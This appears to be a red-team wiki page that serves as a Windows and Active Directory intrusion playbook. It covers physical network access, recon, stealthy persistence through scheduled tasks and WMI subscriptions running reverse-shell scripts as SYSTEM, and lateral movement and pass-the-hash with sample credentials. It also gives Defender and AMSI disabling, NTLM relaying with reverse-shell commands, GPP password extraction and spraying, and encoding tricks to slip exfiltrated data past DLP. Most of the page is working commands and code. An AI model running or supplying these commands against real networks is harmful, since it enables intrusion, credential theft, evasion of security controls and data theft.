---
title: Common Use Cases
---

# Common Red Team Cases

There is a dedicated section for AD Attacks [located here](https://kb.payatu.io/Active%20Directory/BloodHound/)

The below section is from a redteam perspective. Recon, Lateral movement, Persistence and data exfiltration is discussed here.

## What to do when you are physically inside the premises and you want access to the organisation's network?

**Objective: Get access to the network first**

* Plant a Lan Turtle and access the internal network over VPN.
* We can sit inside the campus and perform assessment from our/client's machine after getting connected to the network.
* Either plug in the LAN cable or Wifi routers can be place with HIdden SSID using any unused LAN cable.
* Send a malware which gives us remote access over our C2 server

## What to do when you are a Non-domain member \(but connected to the network\).

We can perform a network recon, understand the network scenario, number of hosts, number of Domain controllers, etc

**Network Recon & Access checklist:**

* Find out List of machines in the subnet
  * Ping and arp scan to find out the machines in the subnet and also the DNS server.
  * Port scan to find out the services running for few machines. Port scan should only be used on very selected ports for less noise.
* Check if we can get access to any sensitive web service or server admin page.
  * Try for default creds
  * Try to bruteforce if there is no account lockout using hydra, Burpsuite or similar tools.
* Try dumping packets if nothing works which might reveal certain credentials.
* Try out password spraying with few default passwords to login into any windows machine.
* Try out responder to get NTLMv2 hashes which could be cracked later which would give us domain user/admin access.
* Get these details as part of Recon Activity:
  * systeminfo
  * Network details
  * Username and the domain name it is connected to
  * Which groups the user is added to
  * Arp table of the machine
  * Any sensitive document stored in the documents folder
  * Find out domain admins, domain computers
  * Shares available on the network
  * Forest, Trust, sites
  * DNS zones and records
  * Printers
  * AV product detection
* Tools to be used for these- Powerview, Ad-Recon, Bloodhound

## What to do after you have access to a domain user cred or you have access to a domain connected system.

How to reach to this stage?

* We can either get a reverse shell straight from a domain member from empire
* We can pivot through the non-domain member machine\(DMZ machine/LAN Turtle\) to our C2 server and get us a reverse shell.
* We can sit in the campus and then take access of a domain member and perform assessment over there only.

**Steps from recon to data exfiltration:**

1. Network/AD recon
2. Persistence \(without SYSTEM rights\)
3. Privilege Escalation
4. Persistence \(With SYSTEM rights\)
5. Lateral Movement
6. Hash dump to get creds/hashes
7. Pivoting
8. Exploiting AD Misconfigurations
9. Data exfiltration
10. Running clean-up after an assessment

## Persistence \(userland\)

* **Persistence through Scheduled tasks \(Schtasks\)**
  * schtasks /create /tn OfficeUpdaterC /tr "powershell -w 1 -Exec BypaSs C:\Users\alpha\Desktop\redteam\rev.ps1" /sc onidle /i 2 \(would get executed when the system remains idle for 2 minutes\)
  * schtasks /create /tn OfficeUpdaterC /tr "powershell -w 1 -Exec BypaSs C:\Users\alpha\Desktop\redteam\rev.ps1" /sc onstart /ru System \(At restart - needs elevation\)
  * SchTasks /Create /SC DAILY /TN "MSRestart" /TR "powershell -w 1 -Exec BypaSs C:\Users\alpha\Desktop\redteam\rev.ps1" /ST 17:35 \(At 5:35 PM, daily\)
  * SchTasks /Create /SC HOURLY /mo 1 /TN "MRestart4" /TR "cmd /c C:\Users\alpha\rev.bat" /ST 23:22 /F \(executes the bat file every hour starting at 23:22\)
  * schtasks /query \(shows the scheduled tasks\)
  * SCHTASKS /Delete /TN "OfficeUpdaterC" /F \(Delete that scheduled task\)
* **Persistence through WMI**
  * [https://github.com/FortyNorthSecurity/WMIOps](https://github.com/FortyNorthSecurity/WMIOps)
  * [https://pentestlab.blog/2017/11/20/command-and-control-wmi/](https://pentestlab.blog/2017/11/20/command-and-control-wmi/)
  * [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
  * [https://blog.ropnop.com/using-credentials-to-own-windows-boxes/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
  * [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
  * [http://www.labofapenetrationtester.com/2016/09/amsi.html](http://www.labofapenetrationtester.com/2016/09/amsi.html) \(Bypass AMSI\)

## Persistence \(Elevated\)

* **Create WMI events**

The below powershell code will execute wmi.bat after a restart. No popups are shown on the screen. It's very stealthy. $Query defines the condition. We can change it accordingly. It will give us a SYSTEM shell.

From a non-interactive shell, we need to transfer this script as text file and then rename it to .ps1 and then execute it.

```text
$filterName = 'BotFilter82'
$consumerName = 'BotConsumer23'
$exePath = 'C:\users\alpha\wmi.bat'

$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 360"

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```

Using this query will execute the command at 11:33

```text
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 11 AND TargetInstance.Minute = 33 AND TargetInstance.Second = 0"
```

* **Scheduled Tasks**

The below command will run the given command as SYSTEM. No popups on the screen. Just added /RU system in the command.

```text
SchTasks /Create /RU system /SC HOURLY /mo 1 /TN "MRestart44" /TR "cmd /c C:\Users\alpha\rev.bat" /ST 01:06 /F
```

## Lateral Movement from Kali

* Metasploit smb\_login

```text
use auxiliary/scanner/smb/smb_login
set SMBDomain CSCOU
set SMBUser jarrieta
set SMBPass nastyCutt3r
set RHOSTS 10.1.1.0/24
exploit
```

![smb\_login msf](https://kbassets.sgp1.digitaloceanspaces.com/1563536103060-1.png)

* CrackMapexec

`python crackmapexec.py 10.1.1.0/24 -d adlab -u charlie -p Rash2kool$`

Pwn3d! means admin access on that machine.

![crackmapexec](https://kbassets.sgp1.digitaloceanspaces.com/1563536203826-2.png)

crackmapexec 10.0.0.4 -d adlab -u charlie -p Rash2kool$ -x 'systeminfo' \(executes one single command on the remote host\)

![crackmapexec command execution](https://kbassets.sgp1.digitaloceanspaces.com/1563537151320-3.png)

* Python psexec.py ADLAB/charlie:'Rash2kool$'@10.0.0.4 \(Gets caught bcz it places a binary on the system\)
* Python smbexec.py ADLAB/charlie:'Rash2kool$'@10.0.0.4 \(Doesn't get caught as it doesn't place a binary on the system, gives the NT Authority\)

![Smbexec](https://kbassets.sgp1.digitaloceanspaces.com/1563537261397-4.png)

* python wmiexec.py ADLAB/charlie:'Rash2kool$'@10.0.0.4 \(Tells if the creds is correct or the access is granted\)
* rdesktop -d adlab -u charlie -p Rash2kool$ 10.0.0.4 \(we can rdesktop to a system if the other user is away. We can tell this by looking at the warning message in rdesktop\)

This only works if that user is added to ‘Remote Desktop Users’ or 'Domain Admins' group.

* smbclient //10.0.0.4/C$ -U adlab/charlie \(mount the remote shares - can download and upload sensitive files\)

![smbclient](https://kbassets.sgp1.digitaloceanspaces.com/1563537470652-5.png)

## Lateral Movement from Windows

* If we have admin access to a windows machine but is not connected to domain.

  Opens up a command prompt belonging to that user.

This will only open up a cmd window in that user's context.

`runas /netonly /user:adlab\alpha “cmd.exe”`

![run as](https://kbassets.sgp1.digitaloceanspaces.com/1563538152476-6.png)

* Psexec \(Doesn't get caught at all by AV's. Need admin creds\)

```text
PsExec64.exe -accepteula \\10.0.0.2 -u rashid -p payatu_dev12 cmd.exe (connectes to a local account on a remote system)
PsExec64.exe -accepteula \\10.0.0.2 -u adlab\charlie -p Rash2kool$ cmd.exe (connects to a domain account on a remote system)
```

![psexec](https://kbassets.sgp1.digitaloceanspaces.com/1563538250344-7.png)

* WMI for data collection and remote command execution

```text
wmic /node:10.0.0.2 path win32_loggedonuser get antecedent (Get logged on users on a remote system. Needs admin rights on local PC)
wmic /node:prod1.adlab.local path win32_loggedonuser get antecedent
```

![wmic](https://kbassets.sgp1.digitaloceanspaces.com/1563538361130-9.png)

```text
wmic /node:10.0.0.2 /user:adlab\charlie path win32_process call create "*One liner command*"
wmic /node:10.0.0.2 /user:adlab\charlie path win32_process call create "net user hacker Admin@123# /add" (Execute any one liner command remotely)
```

![wmic](https://kbassets.sgp1.digitaloceanspaces.com/1563538375319-10.png)

## Hash Dumping and Pass the hash attack

Considering, we have the NTLM hash of a domain admin account.

**Hash Dumping From kali**

**Using wmiexec.py and smbexec.py**

```text
python wmiexec.py -hashes :126368b55d7823b6adab3e860fbfc3b1 ADLAB/charlie@10.0.0.4 (gives user access)
python smbexec.py -hashes :126368b55d7823b6adab3e860fbfc3b1 ADLAB/charlie@10.0.0.4 (gives Nt Authority access)
```

![wmiexec](https://kbassets.sgp1.digitaloceanspaces.com/1563772025994-11.png)

**CrackMapexec**

`crackmapexec 10.0.0.4 -d adlab -u charlie -H 126368b55d7823b6adab3e860fbfc3b1 -x 'ipconfig'`

![crackmapexec](https://kbassets.sgp1.digitaloceanspaces.com/1563772289745-12.png)

`cme 172.29.8.0/21 -u Administrator -p 'V!dy@5a9ar' -t 5 --local-auth (for local admin accounts)`

![cme](https://kbassets.sgp1.digitaloceanspaces.com/1563772348742-13.png)

**Hash dumping from Windows**

**Using standalone binaries of smbexec and wmiexe**

`smbexec.exe -hashes :126368b55d7823b6adab3e860fbfc3b1 ADLAB/charlie@10.0.0.4`

![smbexec](https://kbassets.sgp1.digitaloceanspaces.com/1563772456220-14.png)

## Data exfiltration bypassing the DLP

DLP only flags the content if it can read the data. If possible encrypt the data and try uploading it on attack server. If the DLP denies flags the encrypted content, base64 encode it. Below is a unique way to bypass DLP detection when exfiltrating senstive data from remote system.

If no encryption tools are available, we can just base64 encode it and then base32 encode it. This would prevent DLP detection most of the times.

_**Data &gt; encrypted zip file &gt; base64 &gt; base32 &gt; paste/upload &gt; base32 &gt; base64 &gt; encrypted zip file**_

```text
certutil -encode file.zip data.b64
certutil -encode data.b64 data32.b32

certutil -decode data32.b32 data.b64
certutil -decode data.b64 file.zip
```

## AMSI Bypass

[http://www.labofapenetrationtester.com/2016/09/amsi.html](http://www.labofapenetrationtester.com/2016/09/amsi.html) - AMSI bypass

`Set-MpPreference -DisableIOAVProtection $true` \(disables in memory downloader malware checks - enough for us\)

This command doesn't show any notification to the user but:

• An elevated shell is still required and; • Event ID 5004 is generated \(Microsoft-Windows-Windows Defender/Operational\) - Windows Defender Real-Time Protection feature \(IE Downloads and Outlook Express attachments\) configuration has changed.

`powershell -version 2` \(only works properly if .Net 3.0 is installed\) - Starts powershell version 2 which doesn't have AMSI inbuilt. We can execute our PS malware using this.

## Using Responder and NtlmRelayx

[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

**Gathering NetNTLM hashes via Responder & Inveigh**

Responder runs a performs Netbios and LLMNR Name Poisoning

`responder -I eth0 -i 10.0.0.5`

![responder](https://kbassets.sgp1.digitaloceanspaces.com/1563772910176-15.png)

`responder -I eth0 -i 10.0.0.5 -Fwb` \(will start a basic NTLM auth server and capture the server response. The user will get a popup when it tries to open any fake web page\)

![responder](https://kbassets.sgp1.digitaloceanspaces.com/1563772948080-16.png)

The trick here is to change the internet explorer's home page from Internet options via social engg. to some random domain. That random domain will never get resolved through DNS and it will ask for a basic popup thus our creds would be captured in plaintext as well as netNTLMv2 hash.

**Command Execution through relaying using Responder & Ntlmrelayx**

Find out hosts that do not have smb signing enabled and save them in a text file \(targets.txt\)

`nmap --script smb-security-mode.nse -p445 10.0.0.1/24` \(find out other tools to do the same as well\)

We can use nmap or latest crackmapexec to find out hosts those who have smb signing disabled Now run responder after turning off http and smb server in /etc/responder/responder.conf

![responder](https://kbassets.sgp1.digitaloceanspaces.com/1563773060284-17.png)

Now run ntlmrelayx and specify the target host file

```text
python ntlmrelayx.py -tf targets.txt (if no command specified, it will run secretsdump and give us the SAM dump)
python ntlmrelayx.py -tf targets.txt -c “powershell -Enc .... ” (or we can specify a command like a powershell reverse shell or adding a new user)
```

![ntlmrelayx](https://kbassets.sgp1.digitaloceanspaces.com/1563773092175-18.png)

## Find GPP passwords and try to login using the found password

`findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml`

![gpp](https://kbassets.sgp1.digitaloceanspaces.com/1563773183499-19.png)

Either browse directly to %logonserver% or search for open shares through softperfect network scanner

Browse to policies folder and run the above commands to get relevant information.

Now, decrpyt the password using this PS script

[https://github.com/obscuresec/PowerShell/blob/master/Get-DecryptedCpassword](https://github.com/obscuresec/PowerShell/blob/master/Get-DecryptedCpassword)

![](https://kbassets.sgp1.digitaloceanspaces.com/1563773249240-20.png)

Use this username and password to login across the subnet using cme

`cme 172.29.8.0/21 -u Administrator -p 'V!dy@5a9ar' -t 5 --local-auth` \(for spraying to local accounts\)

![cme](https://kbassets.sgp1.digitaloceanspaces.com/1563773362342-21.png)

